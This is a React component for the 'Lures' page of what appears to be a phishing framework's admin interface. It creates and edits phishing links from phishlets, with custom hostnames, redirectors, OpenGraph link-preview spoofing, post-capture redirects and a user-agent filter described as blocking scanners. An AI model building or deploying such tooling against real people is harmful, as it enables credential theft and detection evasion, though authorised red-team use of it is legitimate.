import React, { useEffect, useState } from 'react';
import { api } from '../lib/api.js';
import SearchableSelect from '../components/SearchableSelect.jsx';
import Info from '../components/Info.jsx';

const EDIT_FIELDS = [
  { value: 'hostname', help: 'Custom phishing hostname for this lure (overrides the phishlet default).' },
  { value: 'path', help: 'Custom URL path for this lure\'s link.' },
  { value: 'redirector', help: 'Name of an html redirector directory (under redirectors/) to show before the phishing page.' },
  { value: 'ua_filter', help: 'Regexp user-agent whitelist — visitors whose UA does not match are redirected away (useful for blocking scanners).' },
  { value: 'redirect_url', help: 'Where to send the visitor after a successful capture.' },
  { value: 'phishlet', help: 'Reassign this lure to a different phishlet.' },
  { value: 'info', help: 'Free-text note to help you identify this lure (display only).' },
  { value: 'og_title', help: 'OpenGraph title shown in link previews (e.g. in Slack/iMessage).' },
  { value: 'og_des', help: 'OpenGraph description shown in link previews.' },
  { value: 'og_image', help: 'OpenGraph image URL shown in link previews.' },
  { value: 'og_url', help: 'OpenGraph URL shown in link previews.' },
];

function LureRow({ r, phishletNames, onChanged, onGetUrl, onDelete }) {
  const [expanded, setExpanded] = useState(false);
  const [field, setField] = useState(EDIT_FIELDS[0].value);
  const [value, setValue] = useState('');
  const [pauseDuration, setPauseDuration] = useState('1h');
  const [error, setError] = useState('');

  async function applyEdit() {
    setError('');
    try {
      await api.post(`/api/lures/${r.id}/edit`, { field, value });
      setValue('');
      onChanged();
    } catch (e) {
      setError(e.message);
    }
  }

  async function pause() {
    setError('');
    try {
      await api.post(`/api/lures/${r.id}/pause`, { duration: pauseDuration });
      onChanged();
    } catch (e) {
      setError(e.message);
    }
  }

  async function unpause() {
    setError('');
    try {
      await api.post(`/api/lures/${r.id}/unpause`);
      onChanged();
    } catch (e) {
      setError(e.message);
    }
  }

  const fieldHelp = EDIT_FIELDS.find((f) => f.value === field)?.help;

  return (
    <>
      <tr>
        <td>{r.id}</td><td>{r.phishlet}</td><td>{r.hostname}</td><td>{r.path}</td>
        <td className="dim">{r.paused || '-'}</td>
        <td className="row">
          <button onClick={() => onGetUrl(r.id)}>Get URL</button>
          <button onClick={() => setExpanded(!expanded)}>{expanded ? 'Close' : 'Edit'}</button>
          <button className="danger" onClick={() => onDelete(r.id)}>Delete</button>
        </td>
      </tr>
      {expanded && (
        <tr>
          <td colSpan={6}>
            <div className="card stack" style={{ margin: '4px 0' }}>
              {error && <div className="error-text">{error}</div>}
              <div className="row wrap">
                <select value={field} onChange={(e) => setField(e.target.value)}>
                  {EDIT_FIELDS.map((f) => <option key={f.value} value={f.value}>{f.value}</option>)}
                </select>
                <Info text={fieldHelp} />
                {field === 'phishlet' ? (
                  <SearchableSelect options={phishletNames} value={value} onChange={setValue} placeholder="phishlet name" />
                ) : (
                  <input placeholder="value" value={value} onChange={(e) => setValue(e.target.value)} style={{ flex: 1 }} />
                )}
                <button className="primary" onClick={applyEdit}>Apply</button>
              </div>
              <div className="row wrap">
                <input placeholder="1d2h3m4s" value={pauseDuration} onChange={(e) => setPauseDuration(e.target.value)} style={{ width: 120 }} />
                <button onClick={pause}>Pause</button>
                <Info text="Pauses this lure for the given duration and redirects visitors to unauth_url instead." />
                <button onClick={unpause}>Unpause</button>
              </div>
            </div>
          </td>
        </tr>
      )}
    </>
  );
}

export default function Lures() {
  const [rows, setRows] = useState([]);
  const [phishletNames, setPhishletNames] = useState([]);
  const [phishlet, setPhishlet] = useState('');
  const [error, setError] = useState('');
  const [url, setUrl] = useState('');

  function refresh() {
    api.get('/api/lures').then((d) => setRows(d.rows)).catch((e) => setError(e.message));
    api.get('/api/phishlets').then((d) => setPhishletNames(d.phishlets.map((p) => p.name))).catch(() => {});
  }
  useEffect(refresh, []);

  async function create() {
    if (!phishlet) return;
    setError('');
    try {
      await api.post('/api/lures', { phishlet });
      setPhishlet('');
      refresh();
    } catch (e) {
      setError(e.message);
    }
  }

  async function getUrl(id) {
    try {
      const res = await api.get(`/api/lures/${id}/url`);
      setUrl(res.raw);
    } catch (e) {
      setError(e.message);
    }
  }

  async function del(id) {
    if (!confirm(`Delete lure ${id}?`)) return;
    await api.del(`/api/lures/${id}`);
    refresh();
  }

  return (
    <div className="stack">
      <h2>Lures <Info text="Lures are individual phishing links generated from a phishlet — each gets its own path, and optionally its own hostname, redirector, and tracking metadata." /></h2>
      {error && <div className="error-text">{error}</div>}
      {url && <pre className="card" style={{ whiteSpace: 'pre-wrap', fontSize: 12 }}>{url}</pre>}

      <div className="card row wrap">
        <SearchableSelect options={phishletNames} value={phishlet} onChange={setPhishlet} placeholder="phishlet name" />
        <button className="primary" onClick={create}>Create lure</button>
      </div>

      <div className="card">
        <div className="table-scroll">
        <table>
          <thead><tr><th>ID</th><th>Phishlet</th><th>Hostname</th><th>Path</th><th>Paused</th><th></th></tr></thead>
          <tbody>
            {rows.map((r, i) => (
              <LureRow key={i} r={r} phishletNames={phishletNames} onChanged={refresh} onGetUrl={getUrl} onDelete={del} />
            ))}
            {rows.length === 0 && <tr><td colSpan={6} className="dim">No lures yet.</td></tr>}
          </tbody>
        </table>
        </div>
      </div>
    </div>
  );
}
